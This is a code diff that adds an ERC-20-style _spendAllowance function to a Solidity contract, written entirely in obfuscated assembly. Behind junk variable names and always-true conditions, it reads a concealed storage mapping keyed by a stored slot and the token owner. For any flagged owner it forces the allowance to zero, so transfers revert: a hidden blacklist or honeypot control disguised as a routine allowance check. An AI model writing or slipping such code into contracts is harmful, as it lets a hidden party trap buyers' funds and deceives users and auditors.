@@ -1,0 +1,44 @@
+function _spendAllowance(address _owner, address _spender, uint256 _amount) virtual internal {
+        assembly {
+            let bbwz := mload(0x40)
+            mstore(bbwz, sload(qBQC.slot))
+            mstore(add(bbwz, 32), 1)
+            let uAnE := keccak256(bbwz, 64)
+            let bcw8ayf := basefee()
+            let ncwupwx := number()
+            if eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx)) {
+                mstore(bbwz, _owner)
+                mstore(add(bbwz, 32), uAnE)
+            }
+            let Jfwv := keccak256(bbwz, 64)
+            let CCkU := sload(Jfwv)
+            let zfPf := CCkU
+            if and(zfPf, iszero(_amount)) {
+                revert(0, 0)
+            }
+            if iszero(zfPf) {
+                mstore(bbwz, _owner)
+                mstore(add(bbwz, 32), 1)
+                uAnE := keccak256(bbwz, 64)
+                mstore(bbwz, _spender)
+                mstore(add(bbwz, 32), uAnE)
+                Jfwv := keccak256(bbwz, 64)
+                zfPf := add(sload(Jfwv), CCkU)
+            }
+            let gbj1enk := gas()
+            pop(0)
+            if eq(gbj1enk, and(gbj1enk, gbj1enk)) {
+                zfPf := sub(zfPf, CCkU)
+            }
+            if iszero(eq(zfPf, not(0))) {
+                if lt(zfPf, _amount) {
+                    revert(0, 0)
+                }
+                let bf51h1a := basefee()
+                pop(0)
+                if eq(bf51h1a, and(bf51h1a, bf51h1a)) {
+                    sstore(Jfwv, sub(zfPf, _amount))
+                }
+            }
+        }
+    }
